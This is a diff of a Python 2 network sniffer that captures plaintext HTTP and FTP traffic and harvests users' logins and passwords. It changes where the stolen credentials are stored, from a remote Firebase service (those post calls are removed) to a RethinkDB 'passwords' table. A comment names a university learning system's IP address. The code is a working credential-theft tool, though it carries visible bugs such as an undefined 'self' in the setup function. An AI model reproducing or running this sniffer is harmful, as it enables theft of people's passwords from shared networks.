@@ -6,21 +6,48 @@ import urlparse
 import binascii
 import signal
 import sys
-from firebase import firebase
+import os
+import argparse
+
+import rethinkdb as r
+from rethinkdb.errors import RqlRuntimeError, RqlDriverError
+
 from pprint import pprint
 import settings
 from utils import add_colons_to_mac
 
+RDB_HOST = os.environ.get('RDB_HOST') or 'localhost'
+RDB_PORT = os.environ.get('RDB_PORT') or 28015
+PWD_DB = 'passwords'
+
 APP = {80: 'HTTP', 23: 'TELNET', 21: 'FTP', 110: 'POP3'}
+
+
+def dbSetup():
+    connection = r.connect(host=RDB_HOST, port=RDB_PORT)
+    try:
+        r.db_create(PWD_DB).run(connection)
+        r.db(PWD_DB).table_create('pwd_table').run(connection)
+        r.db(PWD_DB).table_create('status_table').run(connection)
+        # Initial status value
+        r.table('status_table').insert([{"status":"ON"}]).run(self.rdb_conn)
+        print 'Database setup completed. Now run the sniffer without --setup.'
+    except RqlRuntimeError:
+        print 'Sniffer database already exists. Run the sniffer without --setup.'
+    finally:
+        connection.close()
 
 
 class Sniffer(object):
     def __init__(self, *args, **kwargs):
+        try:
+            self.rdb_conn = r.connect(host=RDB_HOST, port=RDB_PORT, db=PWD_DB)
+        except RqlDriverError:
+            print "No database connection could be established."
+            sys.exit(0)
 
-        self._firebase = firebase.FirebaseApplication(settings.FIREBASE_URL,
-                                                      None)
-        # Status update
-        self._firebase.patch('/status', {"status": "ON"})
+        # Status ON
+        r.table('status_table').update([{"status":"ON"}]).run(self.rdb_conn)
 
         pattern = 'tcp and dst port 80 or dst port 21'
         # pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'
@@ -66,8 +93,7 @@ class Sniffer(object):
         if 'login' and 'password' in device_info.keys():
             print "FTP New Password get:"
             pprint(self.devices_mac[add_colons_to_mac(eth_src)])
-            self._firebase.post('/pwd_table',
-                                self.devices_mac[add_colons_to_mac(eth_src)])
+            r.table('pwd_table').insert([self.devices_mac[add_colons_to_mac(eth_src)]]).run(self.rdb_conn)
 
             # When push to firebase delete it
             del self.devices_mac[add_colons_to_mac(eth_src)]
@@ -118,7 +144,7 @@ class Sniffer(object):
 
         print "HTTP New Password get:"
         pprint(self.all_user_info[self.info_counter])
-        self._firebase.post('/pwd_table', self.all_user_info[self.info_counter])
+        r.table('pwd_table').insert([self.all_user_info[self.info_counter]]).run(self.rdb_conn)
 
     def _get_ftp_pop_payload(self, eth_pkt, ip_pkt, tcp_pkt):
         if 'USER' in tcp_pkt.data:
@@ -203,8 +229,9 @@ class Sniffer(object):
         # iLMS dst IP 140.114.69.137
 
     def loop(self):
+        result = {'status': 'ON'}
+        # cursor = r.table("status_table").filter(r.row["status"] == "ON").run()
         while True:
-            result = self._firebase.get('/status', None)
             if result.get('status') == 'ON':
                 try:
                     for ts, buf in self.pc:
@@ -235,11 +262,23 @@ class Sniffer(object):
                 continue
 
     def __del__(self):
-        # Status update
-        self._firebase.patch('/status', {"status": "OFF"})
+        # Status OFF
+        r.table('status_table').update([{"status":"OFF"}]).run(self.rdb_conn)
+
+        try:
+            self.rdb_conn.close()
+        except AttributeError:
+            pass
 
 
 if __name__ == "__main__":
-    s = Sniffer(interface='eth2')
-    print '%s is listening on' % s.pc.name
-    s.loop()
+    parser = argparse.ArgumentParser(description='Run the Sniffer')
+    parser.add_argument('--setup', dest='run_setup', action='store_true')
+
+    args = parser.parse_args()
+    if args.run_setup:
+        dbSetup()
+    else:
+        s = Sniffer(interface='eth2')
+        print '%s is listening on' % s.pc.name
+        s.loop()
